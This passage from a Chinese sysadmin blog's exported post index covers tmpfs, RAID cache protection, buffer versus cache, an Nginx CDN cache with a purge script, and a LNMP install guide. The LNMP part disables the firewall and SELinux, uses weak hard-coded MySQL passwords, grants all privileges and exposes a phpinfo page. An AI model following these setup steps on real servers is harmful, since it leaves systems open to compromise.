1tmpfs是一种基于内存的虚拟文件系统,它最大的特点就是它的存储空间在VM(virtual memory)里面,VM是由linux内核里面的vm子系统管理，现在大多数操作系统都采用了虚拟内存管理机制。 VM(virtual memory)介绍 12345678linux下面VM(virtual memory）的大小由RM(Real Memory)和swap组成RM的大小就是物理内存的大小，而Swap的大小是由你自己决定的。Swap是通过硬盘虚拟出来的内存空间，因此它的读写速度相对RM(Real Memory）要慢许多。那为什么还需要Swap呢？当一个进程申请一定数量的内存时，如内核的vm子系统发现没有足够的RM时，就会把RM里面的一些不常用的数据交换到Swap里面，如果需要重新使用这些数据再把它们从Swap交换到RM里面。 如果你有足够大的物理内存，根本不需要划分Swap分区。所以综上所述, 就会明白: VM最大的存储空间&#x3D;真实内存大小+swap空间大小。但是对于tmpfs本身而言，它并不知道自己使用的空间是RM还是Swap，这一切都是由内核的vm子系统管理的 tmpfs优缺点 123456缺点：不具备持久性，即系统重启后，数据将会丢失优点: (1)动态文件系统大小&#x2F;mnt&#x2F;tmpfs 最初会只有很小的空间，但随着文件的复制和创建，tmpfs 文件系统驱动程序会分配更多的 VM，并按照需求动态地增加文件系统的空间。而且，当 &#x2F;mnt&#x2F;tmpfs 中的文件被删除时，tmpfs 文件系统驱动程序会动态地减小文件系统并释放 VM 资源，这样做可以将 VM 返回到循环当中以供系统中其它部分按需要使用。因为 VM 是宝贵的资源，所以您一定不希望任何东西浪费超出它实际所需的 VM，tmpfs 的好处之一就在于这些都是自动处理的。(2)tmpfs 的另一个主要的好处是它闪电般的速度。因为典型的 tmpfs 文件系统会完全驻留在 RAM 中，读写几乎可以是瞬间的。 /dev/shm介绍 12345&#x2F;dev&#x2F;shm&#x2F;是一个设备文件，它使用就是tmpfs文件系统。注：&#x2F;dev&#x2F;shm&#x2F;这个目录不在硬盘上，而是在内存里，它就所谓的tmpfs。可通过“df -h”命令来查看 如何动态调整/dev/shm tmpfs的大小？ 1234567891011(1)修改文件：&#x2F;etc&#x2F;fstab(2)tmpfs &#x2F;dev&#x2F;shm tmpfs defaults 0 0 改为 tmpfs &#x2F;dev&#x2F;shm tmpfs,defaults,size&#x3D;512m 0 0(3)然后执行命令：mount -o remount &#x2F;dev&#x2F;shm(4)最后通过df -h命令查看大小就变了注：默认tmpfs空间大小为物理内存的一半，比如:64G物理内存，默认tmpfs大小为32G tmpfs(/dev/shm)的使用及应用场景(重点) 1tmpfs是基于内存的，速度是不用说的，硬盘和它没法比。Oracle 中的Automatic Memory Management特性就使用了&#x2F;dev&#x2F;shm。另外如果在运维中好好利用tmpfs，将有意想不到的收获。 应用实例 12345在&#x2F;dev&#x2F;shm建一个tmp，并在业务中与&#x2F;tmp绑定。mkdir &#x2F;dev&#x2F;shm&#x2F;tmp -pchmod 1777 &#x2F;dev&#x2F;shm&#x2F;tmp ls -ld &#x2F;dev&#x2F;shm&#x2F;tmp 12345678910111213141516以下&#x2F;tmp使用tmpfs文件系统的一些应用示例，一般tmpfs内存文件系统在做web缓存，临时文件存储时会对web访问有很好的加速作用，从而提高网站访问的速度。示例1: 将squid的缓存目录cache_dir放到&#x2F;tmp下vi &#x2F;etc&#x2F;squid&#x2F;squid.conf 修改成 cache_dir ufs &#x2F;tmp 256 16 256这里的第一个256表示使用256M内存,重启一下squid服务，这样缓存目录都放在了tmpfs文件中了。示例2:将php的session文件放在&#x2F;tmp下对于一个访问量大的Nginx php的网站，可能tmp下的临时文件都会很多，比如seesion或者一些缓存文件，那么你可以把它保存到tmpfs文件。保存seesion的方法很简单了:只要修改php.ini就行了，通过phpinfo测试文件查看你的php session存储位置，如果不在&#x2F;tmp下，修改php.ini文件，修改如下：session.save_path &#x3D; “&#x2F;tmp”示例3:将服务的socket文件放在&#x2F;tmp下如nginx.socket和mysql.sock按照此套路，其他应用也可以这么做。再次强调下：tmpfs数据在重新启动之后不会保留，重启tmpfs数据会丢失，所以有必要做一些脚本做诸如加载，绑定的操作！","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"PHP","slug":"PHP","permalink":"https://garywu520.github.io/tags/PHP/"},{"name":"VM","slug":"VM","permalink":"https://garywu520.github.io/tags/VM/"},{"name":"内存","slug":"内存","permalink":"https://garywu520.github.io/tags/%E5%86%85%E5%AD%98/"},{"name":"swap","slug":"swap","permalink":"https://garywu520.github.io/tags/swap/"},{"name":"tmpfs","slug":"tmpfs","permalink":"https://garywu520.github.io/tags/tmpfs/"},{"name":"RM","slug":"RM","permalink":"https://garywu520.github.io/tags/RM/"},{"name":"Mysql","slug":"Mysql","permalink":"https://garywu520.github.io/tags/Mysql/"},{"name":"内存文件系统","slug":"内存文件系统","permalink":"https://garywu520.github.io/tags/%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"RAID阵列卡缓存机制","slug":"RAID阵列卡缓存机制","date":"2017-09-19T02:20:36.000Z","updated":"2018-01-30T03:20:45.560Z","comments":true,"path":"2017/09/19/RAID阵列卡缓存机制/","link":"","permalink":"https://garywu520.github.io/2017/09/19/RAID%E9%98%B5%E5%88%97%E5%8D%A1%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/","excerpt":"什么是阵列卡高速缓存保护？ 1能够提供&quot;高速缓存回写&quot;是raid控制器卡的诸多优点之一。高速缓存回写通过在服务器使用高峰时间将数据保存到高性能缓存当中，来提高应用程序的运行性能。当服务器出现用户访问间隙的时，数据会从高速缓存写入到磁盘阵列当中。","text":"什么是阵列卡高速缓存保护？ 1能够提供&quot;高速缓存回写&quot;是raid控制器卡的诸多优点之一。高速缓存回写通过在服务器使用高峰时间将数据保存到高性能缓存当中，来提高应用程序的运行性能。当服务器出现用户访问间隙的时，数据会从高速缓存写入到磁盘阵列当中。 工作原理 12345在正常的回写操作中，数据被写入高数缓存（dram）之后，系统IO将向应用程序发出数据写入完成的应答，并在随后的时间里将数据写入磁盘。但是，如果回写高速缓存被启动，一旦出现断电，写入dram的数据就可能丢失。由于控制器已经向IO发出了数据写入完成的应答，应用程序并不知道数据发生丢失。为了降低这种风险，配备了高速缓存的企业raid控制器通常采用备用电池（BBU）选项。目的是当服务器供电中断是向控制器提供电源。保护高速缓存中的数据不丢失。目前有两种高速缓存保护选项：BBU备份电池和CacheVault保护选项。 BBU备份电池 1不多说，即给RIAD阵列卡提供独立供电的电池，一般型号都会有，比如:Dell R720 CacheVault技术 12345CacheVault技术采用NAND和超级电容闪存来为raid控制器提供高速缓存保护。当服务器发生断电或者故障时，CacheVault可以自动将缓存在dram中的数据转移至闪存当中。当电源恢复后，NAND闪存中的数据将会被拷贝回高速缓存，直至数据写入磁盘驱动器。 优点：消除了锂电池所需要的硬件维护，降低了控制器使用寿命期间的总体成本，提供了更加环保的高速缓存保护技术，同时使raid控制器的性能保持最佳状态。 选项配置 1根据不同型号，翻阅官方相关文档来启用高速缓存保护配置。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"RAID","slug":"RAID","permalink":"https://garywu520.github.io/tags/RAID/"},{"name":"阵列卡","slug":"阵列卡","permalink":"https://garywu520.github.io/tags/%E9%98%B5%E5%88%97%E5%8D%A1/"},{"name":"缓存","slug":"缓存","permalink":"https://garywu520.github.io/tags/%E7%BC%93%E5%AD%98/"}]},{"title":"buffer与cache的深入理解","slug":"buffer与cache的深入理解","date":"2017-09-19T02:00:26.000Z","updated":"2017-09-19T02:15:22.095Z","comments":true,"path":"2017/09/19/buffer与cache的深入理解/","link":"","permalink":"https://garywu520.github.io/2017/09/19/buffer%E4%B8%8Ecache%E7%9A%84%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/","excerpt":"深入理解buffer与cache","text":"深入理解buffer与cache Cache 1234Cache：即读缓存cache是位于CPU和主内存之间的容量较小但速度很快的存储器，因为CPU的速度远远高于主内存的速度，CPU从内存中读取数据需等待很长的时间，而Cache保存着CPU刚用过的数据或循环使用的部分数据，这时从Cache中读取数据会更快，减少了CPU等待的时间，提高了系统的性能。Cache缓存的不是文件，而是缓存块(块是I&#x2F;O读写最小的单元)；Cache一般会用在I&#x2F;O请求上（即读缓存），如果多个进程要访问某个文件，可以把此文件读入Cache中，这样下一个进程获取CPU控制权并访问此文件直接从Cache读取，提高系统性能。 Buffer 123456Buffer：即写缓冲buffer缓冲区，用于存储速度不同步的设备或优先级不同的设备之间传输数据；通过buffer可以减少进程间通信需要等待的时间。当存储速度快的设备与存储速度慢的设备进行通信时，存储慢的数据先把数据存放到buffer，达到一定程度存储快的设备再读取buffer的数据，在此期间存储快的设备CPU可以干其他的事情。Buffer：一般是用在写入磁盘的，例如：某个进程要求多个字段被读入，当所有要求的字段被读入之前已经读入的字段会先放到buffer中。 查看系统内Buffers与Cached 123cat &#x2F;proc&#x2F;meminfofree -mthtop","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"buffer","slug":"buffer","permalink":"https://garywu520.github.io/tags/buffer/"},{"name":"cache","slug":"cache","permalink":"https://garywu520.github.io/tags/cache/"},{"name":"读缓存","slug":"读缓存","permalink":"https://garywu520.github.io/tags/%E8%AF%BB%E7%BC%93%E5%AD%98/"},{"name":"写缓冲","slug":"写缓冲","permalink":"https://garywu520.github.io/tags/%E5%86%99%E7%BC%93%E5%86%B2/"}]},{"title":"使用Nginx反向代理做cache缓存-实现CDN功能","slug":"使用Nginx反向代理做cache缓存-实现CDN功能","date":"2017-09-17T05:45:14.000Z","updated":"2017-09-17T07:21:17.452Z","comments":true,"path":"2017/09/17/使用Nginx反向代理做cache缓存-实现CDN功能/","link":"","permalink":"https://garywu520.github.io/2017/09/17/%E4%BD%BF%E7%94%A8Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%81%9Acache%E7%BC%93%E5%AD%98-%E5%AE%9E%E7%8E%B0CDN%E5%8A%9F%E8%83%BD/","excerpt":"目标 1使用Nginx反向代理做cache缓存-实现CDN功能","text":"目标 1使用Nginx反向代理做cache缓存-实现CDN功能 环境 12192.168.56.11是CDN节点192.168.56.12是资源源站 源站nginx配置12345678910源站nginx配置：yum install -y nginxhostnamectl set-hostname linux-node2echo &quot;This is linux-node2&quot; &gt;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html端口修改为8080nginx -tsystemctl status nginx要求：能正常使用curl请求访问资源。curl -H &quot;Host:www.exmail.com&quot; http:&#x2F;&#x2F;192.168.56.12:8080 CDN节点-配置123CDN节点nginx配置：yum install -y nginxcd &#x2F;etc&#x2F;nginx&#x2F;conf.d 配置nginx vim www.example.com.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445server&#123; listen 80; server_name www.example.com; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;www.example.com-access.log main; ##给这些静态资源做缓存 location ~ .*\\.(gif|jpg|png|html|htm|css|js|ico|swf|pdf)$ &#123; #Proxy proxy_redirect off; proxy_next_upstream http_502 http_504 http_404 error timeout invalid_header; proxy_set_header Host $host; proxy_set_header X-real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http:&#x2F;&#x2F;www.example.com.pool; #Use Proxy Cache proxy_cache cache_one; #定义的缓存池名称 proxy_cache_key &quot;$host$request_uri&quot;; #定义缓存存放目录的子目录命名规则 add_header Cache &quot;$upstream_cache_status&quot;; #缓存的HTTP头部加了一个Cache proxy_cache_valid 200 304 301 302 8h; proxy_cache_valid 404 1m; proxy_cache_valid any 2d; &#125; #回源区，如果上面的location没有命中，则使用下面的配置访问源站信息 location &#x2F; &#123; proxy_redirect off; proxy_next_upstream http_502 http_504 http_404 error timeout invalid_header; proxy_set_header Host $host; proxy_set_header X-real-ip $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http:&#x2F;&#x2F;www.example.com.pool; client_max_body_size 40m; client_body_buffer_size 128k; proxy_connect_timeout 60; proxy_send_timeout 60; proxy_read_timeout 60; proxy_buffer_size 64k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; &#125;&#125; 配置upstream vim upstrem.conf 1234upstream www.example.com.pool&#123; server 192.168.56.12:8080 weight&#x3D;10 max_fails&#x3D;3; #可以添加多个&#125; 配置CDN 创建CDN缓存存放目录 1mkdir -p &#x2F;data&#x2F;cdn_cache&#x2F; vim proxy.conf 12345678910111213#CDN#临时缓存目录proxy_temp_path &#x2F;data&#x2F;cdn_cache&#x2F;proxy_temp_dir; #真实缓存存放目录（其中cache_one是定义的一个缓存区域名称）proxy_cache_path &#x2F;data&#x2F;cdn_cache&#x2F;proxy_cache_dir levels&#x3D;1:2 keys_zone&#x3D;cache_one:50m inactive&#x3D;1d max_size&#x3D;1g;proxy_connect_timeout 5;proxy_read_timeout 60;proxy_send_timeout 5;proxy_buffer_size 16k;proxy_buffers 4 64k;proxy_busy_buffers_size 128k;proxy_temp_file_write_size 128k;proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_404; 12345配置检查nginx -t启动服务systemctl status nginx 测试1234567891011121314151617181920CDN节点访问：[root@linux-node1 nginx]# curl -H &quot;Host:www.exmail.com&quot; http:&#x2F;&#x2F;192.168.56.11&#x2F;index.htmlthis is linux-node2[root@linux-node1 nginx]# tree &#x2F;data&#x2F;cdn_cache&#x2F;data&#x2F;cdn_cache├── proxy_cache_dir│ ├── b│ │ └── ec│ │ └── abe4950dded0468475eb27f43c676ecb│ └── d│ └── 3e│ └── 9f4970c1daafbbba52d6e625e05f23ed└── proxy_temp_dir本地浏览器访问:添加host解析，网页访问测试。http:&#x2F;&#x2F;www.example.com&#x2F;index.html我们使用firebug看看HTTP请求头部信息,当出现了&quot;Cache HIT&quot;说明已经命中。如果出现：Cache MISS说明没有被缓存命中。 12345678910111213141516171819202122注：CDN缓存目录数据存放规则：cd &#x2F;data&#x2F;cdn_cache&#x2F;proxy_cache_dir&#x2F; #进入实际缓存目录cd .&#x2F;d&#x2F;3e目录cat 9f4970c1daafbbba52d6e625e05f23ed &quot;59bdf88c-14&quot; KEY: www.exmail.com&#x2F;index.html HTTP&#x2F;1.1 200 OK#注：md5sum加密的是&quot;www.exmail.com&#x2F;index.html&quot;字符,此处的key值定义规则在www.example.com.conf配置文件中的proxy_cache_key &quot;$host$request_uri&quot;;目录命名规则：&#x2F;data&#x2F;cdn_cache&#x2F;├── proxy_cache_dir│ ├── 6│ │ └── e1│ │ └── 8ef7ececfe8528bffb1d8ae1f639ce161. 将用户访问的URL进行md5sum加密，然后取第一列，假设为：8ef7ececfe8528bffb1d8ae1f639ce162. 第一级目录是倒数第一位数字命名,此处为：63. 第二级目录是倒数第1位和第2位数字命名,此处为：e1 CDN删除缓存-脚本1234567891011121314151617181920212223242526272829303132333435363738#!&#x2F;bin&#x2F;bashcache_purge()&#123;PURGE_URL&#x3D;$1 URL_NAME&#x3D;$(echo -n $PURGE_URL | md5sum | awk &#39;&#123;print $1&#125;&#39;) FILE_NAME&#x3D;$(echo $URL_NAME | awk &#39;&#123;print &quot;&#x2F;data&#x2F;cdn_cache&#x2F;proxy_cache_dir&#x2F;&quot;substr($0,length($0),1)&quot;&#x2F;&quot;substr($0,length($0)-2,2)&quot;&#x2F;&quot;$0&#125;&#39;) rm -rf $FILE_NAME &#125;purge_file()&#123;PURGE_FILE&#x3D;$1for url in $(cat $PURGE_FILE);docache_purge $urldone&#125;purge_url()&#123;PURGE_URL&#x3D;$1cache_purge $PURGE_URL&#125;usage()&#123;echo $&quot;Usage: $0 &lt;url_file | &#39;url&#39;&gt;&quot;&#125;main ()&#123;if [ &quot;$#&quot; -ne 1 ];thenusage;elseif [ -f $1 ];thenpurge_file $1;elsepurge_url $1;fifi&#125;main $1 使用 12chmod +x nginx_refresh.&#x2F;nginx_refresh www.example.com&#x2F;index.html 第三方清除缓存 12第三方扩展模块ngx_cache_purge，编译安装可实现清除缓存https:&#x2F;&#x2F;www.lvtao.net&#x2F;web&#x2F;nginx-cache-purge.html 排错1234561.检查源站是否能够正常访问2.检查CDN节点是否能够正常访问源站3.检查CDN节点端口4.检查CDN节点服务5.检查CDN节点日志6.用户到CDN节点之间是否正常 分布式缓存架构-现状123Nginx + Varnish CDNNginx + LuaNginx + ATS(主流架构方式)","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"curl","slug":"curl","permalink":"https://garywu520.github.io/tags/curl/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"CDN","slug":"CDN","permalink":"https://garywu520.github.io/tags/CDN/"},{"name":"cache","slug":"cache","permalink":"https://garywu520.github.io/tags/cache/"}]},{"title":"LNMP架构-部署与配置","slug":"LNMP架构部署","date":"2017-09-16T09:44:09.000Z","updated":"2017-09-23T04:59:52.249Z","comments":true,"path":"2017/09/16/LNMP架构部署/","link":"","permalink":"https://garywu520.github.io/2017/09/16/LNMP%E6%9E%B6%E6%9E%84%E9%83%A8%E7%BD%B2/","excerpt":"LNMP架构部署：","text":"LNMP架构部署： 12345L:Linux ① 系统安装好，基础优化（关闭防火墙、关闭selinux、&#x2F;tmp&#x2F;权限1777）N：NginxM: mysqlP: php 编译安装Nginx 安装nginx所需的pcre库 1pcre 即perl兼容正则表达式，官方：http:&#x2F;&#x2F;www.pcre.org. 安装pcre库是为了使Nginx支持具备URI重写功能的rewrite模块。Nginx的rewirte模块功能几乎是企业应用必须的。 1234[root@web01]# yum install -y pcre pcre-devel openssl-devel #yum安装这两个软件包#下面是gcc编译环境yum install gcc gcc-c++ gcc-g77 flex bison autoconf automake bzip2-devel zlib-devel ncurses-devel libjpeg-devel libpng-devel libtiff-devel freetype-devel pam-devel libxml2-devel gettext-devel pcre-devel openssl-devel 下载编译nginx 1234567官方：http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;download.htmlwget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.10.3.tar.gztar -zxvf nginx-1.10.3.tar.gzcd nginx-1.10.3useradd www -s &#x2F;sbin&#x2F;nologin -M #创建Nginx管理用户id www 1234567891011121314开始编译 1， 配置软件 指定软件有哪些功能 用哪些模块 2， 编译软件 编译成机器能识别的信息 就是 二进制 3， 编译安装软件 安装软件 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;开始编译 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;#编译.&#x2F;configure --prefix&#x3D;&#x2F;application&#x2F;nginx-1.10.3 --user&#x3D;www --group&#x3D;www --with-http_stub_status_module --with-http_ssl_module#安装make &amp;&amp; make install#检查上个命令执行是否成功[0表示成功，非0表示失败]echo $? 1234567891011121314#创建软连接cd &#x2F;applicationln -s &#x2F;application&#x2F;nginx-1.10.3&#x2F; &#x2F;application&#x2F;nginxnginx_PATH&#x3D;&#x2F;application&#x2F;nginxecho $nginx_PATH#启动服务&#x2F;application&#x2F;nginx&#x2F;sbin&#x2F;nginx#查看nginx进程ps -ef |grep nginx#Web浏览器访问测试http:&#x2F;&#x2F;192.168.56.8&#x2F; Nginx目录结构 1234567891011[root@bind-master-23 nginx]# ls -lhtotal 36Kdrwx------ 2 www root 4.0K Sep 14 15:33 client_body_tempdrwxr-xr-x 2 root root 4.0K Sep 14 15:29 conf #Nginx所有相关配置drwx------ 2 www root 4.0K Sep 14 15:33 fastcgi_tempdrwxr-xr-x 2 root root 4.0K Sep 14 15:29 html #Web站点目录drwxr-xr-x 2 root root 4.0K Sep 14 15:33 logs #Nginx服务相关日志文件目录drwx------ 2 www root 4.0K Sep 14 15:33 proxy_tempdrwxr-xr-x 2 root root 4.0K Sep 14 15:29 sbin #相关命令保存目录drwx------ 2 www root 4.0K Sep 14 15:33 scgi_tempdrwx------ 2 www root 4.0K Sep 14 15:33 uwsgi_temp nginx配置文件-详解 1234567891011121314151617181920212223242526worker_processes 1; #定义worker进程数量,多并发可以修改此项events &#123; #此处定义每个worker进程可以处理多少个请求 worker_connections 1024;&#125;http &#123; include mime.types; #支持媒体类型库,即Nginx可以处理什么类型的请求 default_type application&#x2F;octet-stream; #默认处理的类型 sendfile on; #启用高效传输 keepalive_timeout 65; #长连接,超时时间 server &#123; #独立的虚拟主机站点 listen 80; # 监控的端口 server_name localhost; #主机头,虚拟主机的域名 location &#x2F; &#123; #定义的站点根目录 root html; #这里指定的是html index index.html index.htm; #默认首页文件 &#125; error_page 500 502 503 504 &#x2F;50x.html; #当访问出现50x状态错误后，请求的页面 location &#x3D; &#x2F;50x.html &#123; root html; &#125; &#125; &#125; 检查nginx配置文件是否有错误 1&#x2F;application&#x2F;nginx&#x2F;sbin&#x2F;nginx -t nginx平滑重启 1&#x2F;application&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload Nginx多站点配置 12345678910111213141516171819202122232425262728293031323334worker_processes 3;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name www.etiantian.org; location &#x2F; &#123; root html&#x2F;www; \\\\\\\\ 站点 index index.html index.htm; &#125; &#125; server &#123; listen 80; server_name blog.etiantian.org; location &#x2F; &#123; root html&#x2F;blog; index index.html index.htm; &#125; &#125; server &#123; listen 80; server_name bbs.etiantian.org; location &#x2F; &#123; root html&#x2F;bbs; index index.html index.htm; &#125; &#125; &#125; Nginx高级配置: 参考Nginx详解 二进制安装Mysql12345678910111213141516171819202122232425262728293031323334353637① 上传软件包② 解压mysql tar -zxvf mysql-5.6.34-linux-glibc2.5-x86_64.tar.gz③ 添加mysql程序运行时的管理用户 useradd -s &#x2F;sbin&#x2F;nologin -M mysql④ 将解压后的程序目录放到&#x2F;application目录，并进行重命名 mv mysql-5.6.34-linux-glibc2.5-x86_64 &#x2F;application&#x2F;mysql-5.6.34⑤ 创建软链 ln -s &#x2F;application&#x2F;mysql-5.6.34&#x2F; &#x2F;application&#x2F;mysql⑥ 修改权限 cd &#x2F;application&#x2F;mysql &amp;&amp; chown -R mysql.mysql data&#x2F;⑦ 初始化数据库 &#x2F;application&#x2F;mysql&#x2F;scripts&#x2F;mysql_install_db --basedir&#x3D;&#x2F;application&#x2F;mysql --datadir&#x3D;&#x2F;application&#x2F;mysql&#x2F;data --user&#x3D;mysql#### 注释: ############# --basedir&#x3D; 软件安装目录 --datadir&#x3D; 数据存储目录#### 注释: #############⑧ 拷贝脚本文件到&#x2F;etc&#x2F;init.d&#x2F;目录 cp &#x2F;application&#x2F;mysql&#x2F;support-files&#x2F;mysql.server &#x2F;etc&#x2F;init.d&#x2F;mysqld ll &#x2F;etc&#x2F;init.d&#x2F;mysqld ⑨ 修改启动脚本和mysql命令的路径（默认&#x2F;usr&#x2F;local&#x2F;目录下）sed -i &#39;s#&#x2F;usr&#x2F;local&#x2F;mysql#&#x2F;application&#x2F;mysql#g&#39; &#x2F;application&#x2F;mysql&#x2F;bin&#x2F;mysqld_safe &#x2F;etc&#x2F;init.d&#x2F;mysqld⑩ 复制默认配置文件 \\cp &#x2F;application&#x2F;mysql&#x2F;support-files&#x2F;my-default.cnf &#x2F;etc&#x2F;my.cnf 最后启动MySQL的&#x2F;etc&#x2F;init.d&#x2F;mysqld start配置Mysql命令-环境变量echo &#39;export PATH&#x3D;&#x2F;application&#x2F;mysql&#x2F;bin:$PATH&#39; &gt;&gt;&#x2F;etc&#x2F;profilesource &#x2F;etc&#x2F;profilewhich mysql Mysql使用 12345678910111213141516171819202122232425[root@web01 ~]# mysql Welcome to the MySQL monitor. Commands end with ; or \\g.Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.mysql&gt; mysql&gt; show databases; #查看数据库mysql&gt; use mysql; #进入mysql数据库Database changedmysql&gt; show tables; #查看数据库表mysql&gt; quit; #退出数据库show databases; &lt;--- 查询默认的数据库信息create database oldboy; &lt;---创建新的数据库drop database oldboy; &lt;---删除存在的数据库use mysql; &lt;--- 表示选择使用一个数据库，相当于cd进入一个数据库show tables； &lt;---查看数据库中表信息select database(); &lt;--- 表示查看当前所在数据库，类似于pwd命令的功能select user(); &lt;--- 查看当前登录数据库的用户，类似于whoami命令select * from user\\G; &lt;---查看user表中所有信息，并且纵行显示select user,host from user; &lt;---查看user表中指定信息，并且横行显示select user,host from mysql.user; &lt;---查看可以登录mysql数据库的目录，以及都可以从哪里进行管理mysql数据库grant all on *.* to user@&#39;host&#39; identified by &#39;oldboy123&#39;; ---创建用户 grant all on *.* to Old_Boy@&#39;localhost&#39; identified by &#39;oldboy123&#39;; ---创建用户（大写用户）drop user &#39;user&#39;@&#39;host&#39;;flush privileges；&lt;--- 刷新权限 设置密码 12345&#x2F;application&#x2F;mysql&#x2F;bin&#x2F;mysqladmin -u root password &#39;123&#39; #本地方式修改密码&#x2F;application&#x2F;mysql&#x2F;bin&#x2F;mysqladmin -h web01 -u root password &#39;oldboy123&#39; #修改远程密码再次登录mysql -uroot -poldboy123 编译安装PHP1234yum install -y zlib-devel libxml2-devel libjpeg-devel libjpeg-turbo-devel libiconv-devel freetype-devel libpng-devel gd-devel libcurl-devel libxslt-devel gccepel源安装如下依赖：yum -y install libmcrypt-devel mhash mcrypt openssl-devel 安装libiconv 12345tar zxf libiconv-1.14.tar.gzcd libiconv-1.14.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;libiconvmakemake install 编译安装php 编译 123456789101112131415161718192021222324252627282930313233343536373839404142注：LNMP架构如果mysql和web架构不在同一机器上，mysql编译参数需要有所调整把下面的--with-mysql&#x3D;&#x2F;application&#x2F;mysql&#x2F;改为--with-mysql&#x3D;mysqlnd,表示mysql不在本地，下面的防报错配置也无需操作，直接可编译安装cd &#x2F;server&#x2F;tools&#x2F;tar xf php-5.5.32.tar.gzcd php-5.5.32.&#x2F;configure \\--prefix&#x3D;&#x2F;application&#x2F;php-5.5.32 \\--with-mysql&#x3D;&#x2F;application&#x2F;mysql&#x2F; \\--with-pdo-mysql&#x3D;mysqlnd \\--with-iconv-dir&#x3D;&#x2F;usr&#x2F;local&#x2F;libiconv \\--with-freetype-dir \\--with-jpeg-dir \\--with-png-dir \\--with-zlib \\--with-libxml-dir&#x3D;&#x2F;usr \\--enable-xml \\--disable-rpath \\--enable-bcmath \\--enable-shmop \\--enable-sysvsem \\--enable-inline-optimization \\--with-curl \\--enable-mbregex \\--enable-fpm \\--enable-mbstring \\--with-mcrypt \\--with-gd \\--enable-gd-native-ttf \\--with-openssl \\--with-mhash \\--enable-pcntl \\--enable-sockets \\--with-xmlrpc \\--enable-soap \\--enable-short-tags \\--enable-static \\--with-xsl \\--with-fpm-user&#x3D;www \\--with-fpm-group&#x3D;www \\--enable-ftp \\--enable-opcache&#x3D;no 12345防报错配置：ln -s &#x2F;application&#x2F;mysql&#x2F;lib&#x2F;libmysqlclient.so.18 &#x2F;usr&#x2F;lib64&#x2F;touch ext&#x2F;phar&#x2F;phar.pharmakemake install 12345678910创建软链ln -s &#x2F;application&#x2F;php-5.5.32&#x2F; &#x2F;application&#x2F;php配置php解析文件-php-fpmcp &#x2F;server&#x2F;tools&#x2F;php-5.5.32&#x2F;php.ini-production &#x2F;application&#x2F;php&#x2F;lib&#x2F;php.inicp &#x2F;application&#x2F;php&#x2F;etc&#x2F;php-fpm.conf.default &#x2F;application&#x2F;php&#x2F;etc&#x2F;php-fpm.conf启动php&#x2F;application&#x2F;php&#x2F;sbin&#x2F;php-fpmnetstat -lntup|grep php Nginx与php建立连接测试123456location ~* .*\\.(php|php5)?$ &#123; root html&#x2F;blog; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi.conf;&#125; 123456789101112131415配置参考:server &#123; listen 80; server_name blog.etiantian.org; location &#x2F; &#123; root html&#x2F;blog; index index.php index.html index.htm; &#125; location ~* .*\\.(php|php5)?$ &#123; root html&#x2F;blog; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi.conf; &#125; &#125; 12345追加测试页echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt;&#x2F;application&#x2F;nginx&#x2F;html&#x2F;blog&#x2F;test_info.php访问测试http:&#x2F;&#x2F;blog.etiantian.org&#x2F;test_info.php Nginx与Mysql连接测试1234567891011[root@web01 blog]# cat test_mysql.php &lt;?php&#x2F;&#x2F;$link_id&#x3D;mysql_connect(&#39;主机名&#39;,&#39;用户&#39;,&#39;密码&#39;);&#x2F;&#x2F;mysql -u用户 -p密码 -h 主机$link_id&#x3D;mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;oldboy123&#39;) or mysql_error();if($link_id)&#123; echo &quot;mysql successful by root !\\n&quot;; &#125;else&#123; echo mysql_error(); &#125;?&gt; 12访问测试：http:&#x2F;&#x2F;blog.etiantian.org&#x2F;test_mysql.php blog配置1234567891011121.下载网站代码，比如：WordPress tar xf wordpress-4.7.3-zh_CN.tar.gz2. 进入代码程序目录中，将代码移动到站点目录下 mv .&#x2F;* 